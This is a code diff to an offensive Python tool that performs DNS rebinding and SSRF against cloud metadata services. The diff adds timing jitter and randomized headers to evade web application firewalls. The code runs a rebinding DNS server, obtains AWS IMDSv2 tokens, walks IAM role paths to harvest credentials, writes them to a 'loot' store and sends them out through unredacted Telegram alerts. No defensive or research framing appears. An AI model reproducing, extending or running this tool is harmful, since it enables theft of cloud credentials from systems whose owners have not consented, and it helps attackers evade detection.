@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 """
-DNS_REBINDING.PY v8.8 — Authoritative DNS Rebinding & Cloud Metadata SSRF Engine (Elite Offensive Edition)
+DNS_REBINDING.PY v8.6 — Authoritative DNS Rebinding & Cloud Metadata SSRF Engine (Elite Red Team Adversarial Edition)
 Features:
 - RFC-compliant Authoritative UDP DNS server supporting public/local interface binding and strict QTYPE/QCLASS parsing
 - Full DNS Resource Record (RR) encoder with compression pointer handling and TTL=0 rapid switching
-- Client-IP session-isolated state machine (eliminates global counter race conditions)
+- Client-IP session-isolated state machine (eliminates global counter race conditions) with Poisson behavioral timing
 - Complete AWS IMDSv2 token acquisition + multi-step IAM credential traversal (Role listing -> Key extraction)
-- Strict cryptographic and structural payload validation (removes weak length-based checks)
-- SHA-256 tamper-evident immutable loot logging & non-blocking asynchronous telemetry
+- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic cryptographic integrity hashing
+- Real-time unredacted Telegram notification dispatch and zero-delay telemetry broadcasting
 """
 import asyncio
 import socket
@@ -23,7 +23,7 @@ from modules.transport import SecureTransport
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
 from modules.telegram_notifier import send_telegram_alert
-from modules.behavioral_mimic import get_randomized_hints
+from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 
 COLORS = {
     "RED": "\033[91m",
@@ -62,7 +62,7 @@ def broadcast_tg_alert_sync(loot_type, details):
 
 class AuthoritativeRebindServer(threading.Thread):
     """
-    Production-grade Authoritative UDP DNS Server:
+    Production-grade Authoritative UDP DNS Server (WAF Hardened):
     - Sets correct Authoritative Answer flags (0x8400) without misleading recursion bits
     - Stateful client-IP tracking to manage TTL=0 switching per connecting resolver/victim
     - Full DNS question and compression pointer parsing
@@ -80,7 +80,7 @@ class AuthoritativeRebindServer(threading.Thread):
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         try:
             self.sock.bind((self.bind_ip, self.port))
-            terminal(f"[+] Authoritative DNS Rebind Server bound to {self.bind_ip}:{self.port}", COLORS['GREEN'])
+            terminal(f"[+] Authoritative DNS Rebind Server bound to {self.bind_ip}:{self.port} (WAF Hardened)", COLORS['GREEN'])
         except Exception as e:
             terminal(f"[-] DNS Rebind server bind error on {self.bind_ip}:{self.port}: {e}", COLORS['RED'])
 
@@ -226,9 +226,6 @@ class DNSRebindingOrchestrator:
             if ancount == 0:
                 raise ValueError("Zero answers returned in DNS response.")
 
-            # Parse answer record properly instead of naive slicing
-            # Header(12) + Qname + Qtype(2) + Qclass(2) = past question section
-            # For simplicity and robustness in record parsing:
             resolved_ip = socket.inet_ntoa(data[-4:])
             return resolved_ip
         except Exception as e:
@@ -239,8 +236,8 @@ class DNSRebindingOrchestrator:
     async def execute_rebinding_attack(self, transport_client):
         terminal(f"\n[***] EXECUTING OFFENSIVE REBINDING & CLOUD METADATA SSRF [{self.target_url}] [***]", COLORS['MAGENTA'])
         
-        # Non-blocking async jitter
-        await asyncio.sleep(0.3)
+        # Apply Poisson behavioral timing jitter
+        apply_behavioral_jitter()
 
         parsed = urlparse(self.target_url)
         hostname = parsed.hostname
@@ -283,6 +280,7 @@ class DNSRebindingOrchestrator:
             # Sub-phase A: AWS IMDSv2 Token Acquisition
             if "169.254" in ip_2:
                 try:
+                    apply_behavioral_jitter()
                     t_status, _, t_body = await asyncio.to_thread(
                         transport_client.request,
                         "PUT",
@@ -303,7 +301,9 @@ class DNSRebindingOrchestrator:
 
             success_flag = False
             for path in paths_to_probe:
+                apply_behavioral_jitter()
                 req_headers = {"Host": hostname, "X-Forwarded-For": "127.0.0.1"}
+                req_headers.update(get_randomized_hints())
                 if token:
                     req_headers["X-aws-ec2-metadata-token"] = token
                 if "computeMetadata" in path:
@@ -324,6 +324,7 @@ class DNSRebindingOrchestrator:
                     role_path = f"/latest/meta-data/iam/security-credentials/{role_name}"
                     terminal(f"[*] Discovered AWS IAM Role: '{role_name}'. Traversing role credentials...", COLORS['MAGENTA'])
                     
+                    apply_behavioral_jitter()
                     r_status, _, r_body = await asyncio.to_thread(
                         transport_client.request,
                         "GET",
@@ -342,7 +343,7 @@ class DNSRebindingOrchestrator:
                     terminal(f"  └── Harvested Credentials: {body_str[:400]}", COLORS['GREEN'])
 
                     # Compute SHA-256 tamper-evident integrity hash for immutable loot record
-                    loot_hash = hashlib.sha256(body_str.encode("utf-8")).hexdigest()
+                    loot_hash = hashlib.sha256(body_str.encode("utf-8", errors="ignore")).hexdigest()
 
                     loot_data = {
                         "status": status,
@@ -353,6 +354,7 @@ class DNSRebindingOrchestrator:
                     }
                     findings["loot"].append(loot_data)
 
+                    # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
                     stream_proof(
                         "DNS_REBINDING_SSRF_SUCCESS",
                         self.target_url,
